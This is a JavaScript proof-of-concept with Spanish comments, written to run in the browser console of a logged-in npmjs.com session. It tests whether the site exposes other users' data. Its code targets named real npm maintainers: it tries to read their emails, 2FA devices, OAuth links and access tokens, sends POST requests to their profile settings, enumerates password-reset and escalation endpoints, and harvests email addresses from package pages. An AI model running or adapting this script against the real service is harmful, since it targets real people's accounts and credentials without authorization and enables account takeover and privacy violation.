// ================================================================
// PoC: Lectura de datos y manipulación de cuentas
// EJECUTAR EN: https://www.npmjs.com (sesión autenticada)
// ================================================================

console.log("=== PoC: Account Data Exposure & Manipulation ===\n");

const spiferackHeaders = {
    'x-spiferack': '1',
    'x-requested-with': 'XMLHttpRequest',
    'manifest-hash': window.__context__?.hash || ''
};
const csrftoken = window.__context__?.csrftoken || '';
const myUser = window.__context__?.user?.name || 'unknown';

async function sGet(path) {
    const res = await fetch(path, { headers: spiferackHeaders, credentials: 'include' });
    const ct = res.headers.get('content-type') || '';
    if (res.ok && ct.includes('json')) return { status: res.status, data: await res.json() };
    return { status: res.status, data: null };
}

async function sPost(path, body = {}) {
    const res = await fetch(path, {
        method: 'POST',
        headers: { ...spiferackHeaders, 'content-type': 'application/json', 'x-csrf-token': csrftoken },
        credentials: 'include',
        body: JSON.stringify({ csrftoken, ...body })
    });
    const ct = res.headers.get('content-type') || '';
    return {
        status: res.status,
        data: res.ok && ct.includes('json') ? await res.json() : await res.text().catch(() => null)
    };
}

(async () => {
    // ================================================================
    // TEST 1: Leer perfil de OTROS usuarios via Spiferack
    // /settings/{user}/profile expone email, TFA, OAuth, etc.
    // ================================================================
    console.log("=== TEST 1: Leer perfil de otros usuarios ===\n");

    // Usuarios conocidos de npm (maintainers de paquetes populares)
    const targetUsers = [
        'isaacs',          // creador de npm
        'ljharb',          // maintainer core
        'sindresorhus',    // prolífico autor
        'bancolombia-os',  // Bancolombia
        'dougwilson',      // express maintainer
    ];

    for (const user of targetUsers) {
        // Intentar settings/profile (acceso admin)
        const r1 = await sGet(`/settings/${user}/profile`);
        if (r1.data && r1.data.formData) {
            console.log(`[!!!] /settings/${user}/profile → HTTP ${r1.status} CON DATOS`);
            console.log(`    EMAIL: ${r1.data.formData?.email?.value || r1.data.formData?.fullName?.value || 'no encontrado'}`);
            console.log(`    Keys: ${Object.keys(r1.data).join(', ')}`);
            if (r1.data.formData) console.log(`    formData keys: ${Object.keys(r1.data.formData).join(', ')}`);
            if (r1.data.tfaDevices) console.log(`    [!!!] tfaDevices: ${JSON.stringify(r1.data.tfaDevices)}`);
            if (r1.data.githubOAuth) console.log(`    [!!!] githubOAuth: ${JSON.stringify(r1.data.githubOAuth)}`);
        } else if (r1.data) {
            console.log(`[+] /settings/${user}/profile → HTTP ${r1.status}, keys: ${Object.keys(r1.data).join(', ')}`);
        } else {
            console.log(`[-] /settings/${user}/profile → HTTP ${r1.status}`);
        }

        // Intentar perfil público con Spiferack
        const r2 = await sGet(`/~${user}`);
        if (r2.data) {
            const d = r2.data;
            console.log(`[+] /~${user} → HTTP ${r2.status}`);
            if (d.scope?.email) console.log(`    [!!!] EMAIL: ${d.scope.email}`);
            if (d.scope?.resource?.email) console.log(`    [!!!] resource.email: ${d.scope.resource.email}`);
            if (d.scope?.resource?.fullname) console.log(`    fullname: ${d.scope.resource.fullname}`);
            if (d.scope?.resource?.github) console.log(`    github: ${d.scope.resource.github}`);
            if (d.scope?.resource?.twitter) console.log(`    twitter: ${d.scope.resource.twitter}`);
            if (d.account) console.log(`    account: ${JSON.stringify(d.account)}`);
            // Buscar email en cualquier parte
            const full = JSON.stringify(d);
            const emailMatch = full.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
            if (emailMatch) console.log(`    [!!!] Emails encontrados: ${[...new Set(emailMatch)].join(', ')}`);
        }
    }

    // ================================================================
    // TEST 2: Leer MI propio perfil para ver qué datos expone
    // (como referencia de qué debería NO ser visible para otros)
    // ================================================================
    console.log("\n=== TEST 2: Mi propio perfil (referencia) ===\n");

    const myProfile = await sGet(`/settings/${myUser}/profile`);
    if (myProfile.data) {
        console.log(`[+] Mi perfil /settings/${myUser}/profile:`);
        console.log(`    Keys: ${Object.keys(myProfile.data).join(', ')}`);
        if (myProfile.data.formData) {
            console.log(`    formData keys: ${Object.keys(myProfile.data.formData).join(', ')}`);
            for (const [k, v] of Object.entries(myProfile.data.formData)) {
                const val = typeof v === 'object' ? (v.value || JSON.stringify(v)) : v;
                console.log(`    formData.${k}: ${String(val).substring(0, 100)}`);
            }
        }
        if (myProfile.data.tfaDevices) console.log(`    tfaDevices: ${JSON.stringify(myProfile.data.tfaDevices)}`);
        if (myProfile.data.githubOAuth) console.log(`    githubOAuth: ${JSON.stringify(myProfile.data.githubOAuth)}`);
        if (myProfile.data.scope) console.log(`    scope: ${JSON.stringify(myProfile.data.scope).substring(0, 300)}`);
    }

    // ================================================================
    // TEST 3: Intentar modificar perfil de OTRO usuario via POST
    // El código usa Router.submit que es básicamente un POST
    // ================================================================
    console.log("\n=== TEST 3: POST a perfil de otro usuario (sin modificar datos reales) ===\n");

    // Solo verificamos si el servidor acepta el POST - NO enviamos cambios reales
    // Usamos datos vacíos/iguales para no causar daño
    for (const user of ['isaacs', 'bancolombia-os']) {
        const r = await sPost(`/settings/${user}/profile`, {
            // Cuerpo vacío excepto CSRF - solo para ver si acepta
        });
        console.log(`POST /settings/${user}/profile → HTTP ${r.status}`);
        if (r.status === 200) {
            console.log(`    [!!!] ACEPTADO - Respuesta: ${JSON.stringify(r.data).substring(0, 300)}`);
        }
    }

    // ================================================================
    // TEST 4: Endpoints de forgot password / reset
    // ================================================================
    console.log("\n=== TEST 4: Password reset endpoints ===\n");

    const resetRoutes = [
        '/forgot',
        '/forgot-password',
        '/password/reset',
        '/login/recover',
        '/auth/reset',
        '/settings/password/reset',
    ];

    for (const route of resetRoutes) {
        const r = await sGet(route);
        if (r.data) {
            console.log(`[+] ${route} → HTTP ${r.status}, keys: ${Object.keys(r.data).join(', ')}`);
            // Si tiene action field, es un form
            if (r.data.action) console.log(`    action: ${r.data.action}`);
            if (r.data.formData) console.log(`    formData: ${JSON.stringify(r.data.formData)}`);
        } else {
            console.log(`[-] ${route} → HTTP ${r.status}`);
        }
    }

    // ================================================================
    // TEST 5: Escalation page - ¿se puede acceder sin sesión válida?
    // ================================================================
    console.log("\n=== TEST 5: Escalation endpoints ===\n");

    const escalateRoutes = [
        `/settings/${myUser}/tfa`,
        `/settings/${myUser}/security`,
        '/auth/escalate',
        '/login/escalate',
    ];

    for (const route of escalateRoutes) {
        const r = await sGet(route);
        if (r.data) {
            console.log(`[+] ${route} → HTTP ${r.status}`);
            console.log(`    Keys: ${Object.keys(r.data).join(', ')}`);
            // Datos sensibles de TFA
            if (r.data.hasTotp !== undefined) console.log(`    hasTotp: ${r.data.hasTotp}`);
            if (r.data.hasWebAuthnDevices !== undefined) console.log(`    hasWebAuthn: ${r.data.hasWebAuthnDevices}`);
            if (r.data.tfaDevices) console.log(`    [!!!] tfaDevices: ${JSON.stringify(r.data.tfaDevices)}`);
            if (r.data.numWebAuthnDevices !== undefined) console.log(`    numWebAuthn: ${r.data.numWebAuthnDevices}`);
        } else {
            console.log(`[-] ${route} → HTTP ${r.status}`);
        }
    }

    // ================================================================
    // TEST 6: ¿Se puede reenviar email de verificación para otro user?
    // POST /verify/resend-email
    // ================================================================
    console.log("\n=== TEST 6: Resend verification email ===\n");

    const resendR = await sPost('/verify/resend-email', {});
    console.log(`POST /verify/resend-email → HTTP ${resendR.status}`);
    if (resendR.status === 200) {
        console.log(`    Respuesta: ${JSON.stringify(resendR.data).substring(0, 300)}`);
    }

    // ================================================================
    // TEST 7: Intentar acceder a tokens de otros usuarios
    // ================================================================
    console.log("\n=== TEST 7: Tokens de otros usuarios ===\n");

    for (const user of ['isaacs', 'ljharb', 'bancolombia-os']) {
        const r = await sGet(`/settings/${user}/tokens`);
        if (r.data) {
            console.log(`[!!!] /settings/${user}/tokens → HTTP ${r.status}`);
            console.log(`    Keys: ${Object.keys(r.data).join(', ')}`);
            if (r.data.tokens) console.log(`    [!!!] TOKENS: ${JSON.stringify(r.data.tokens).substring(0, 500)}`);
        } else {
            console.log(`[-] /settings/${user}/tokens → HTTP ${r.status}`);
        }
    }

    // ================================================================
    // TEST 8: Intentar ver 2FA status de otros usuarios
    // ================================================================
    console.log("\n=== TEST 8: TFA status de otros usuarios ===\n");

    for (const user of ['isaacs', 'ljharb', 'bancolombia-os']) {
        const r = await sGet(`/settings/${user}/tfa`);
        if (r.data) {
            console.log(`[!!!] /settings/${user}/tfa → HTTP ${r.status}`);
            console.log(`    Keys: ${Object.keys(r.data).join(', ')}`);
            if (r.data.hasTotp !== undefined) console.log(`    [!!!] hasTotp: ${r.data.hasTotp}`);
            if (r.data.numWebAuthnDevices !== undefined) console.log(`    [!!!] numWebAuthn: ${r.data.numWebAuthnDevices}`);
        } else {
            console.log(`[-] /settings/${user}/tfa → HTTP ${r.status}`);
        }
    }

    // ================================================================
    // TEST 9: Intentar cambiar email via POST al propio perfil
    // (probamos en nuestra propia cuenta para ver la estructura)
    // ================================================================
    console.log("\n=== TEST 9: Estructura de cambio de email (propia cuenta) ===\n");

    // Solo hacemos GET para ver qué campos tiene el form
    const profileR = await sGet(`/settings/${myUser}/profile`);
    if (profileR.data?.formData) {
        console.log(`Campos del form de perfil:`);
        for (const [k, v] of Object.entries(profileR.data.formData)) {
            console.log(`    ${k}: ${JSON.stringify(v).substring(0, 100)}`);
        }
        console.log(`\n    action del form: ${profileR.data.action || 'no encontrado'}`);
        console.log(`    Requiere escalation: probablemente SÍ para email/password`);
    }

    // ================================================================
    // TEST 10: Probar si podemos ver el email de usuarios via
    // el endpoint de paquetes (publisher.email)
    // ================================================================
    console.log("\n=== TEST 10: Emails via package pages ===\n");

    const packages = ['express', 'react', 'lodash'];
    for (const pkg of packages) {
        const r = await sGet(`/package/${pkg}`);
        if (r.data) {
            // Buscar emails en la respuesta
            const full = JSON.stringify(r.data);
            const emails = full.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
            if (emails) {
                const unique = [...new Set(emails)];
                console.log(`[+] /package/${pkg}: ${unique.length} emails encontrados:`);
                unique.forEach(e => console.log(`    ${e}`));
            } else {
                console.log(`[-] /package/${pkg}: sin emails en la respuesta`);
            }

            // Publisher info
            if (r.data.capsule?.publisher) {
                console.log(`    Publisher: ${JSON.stringify(r.data.capsule.publisher)}`);
            }
        }
    }

    console.log("\n=== FIN ===");
})();
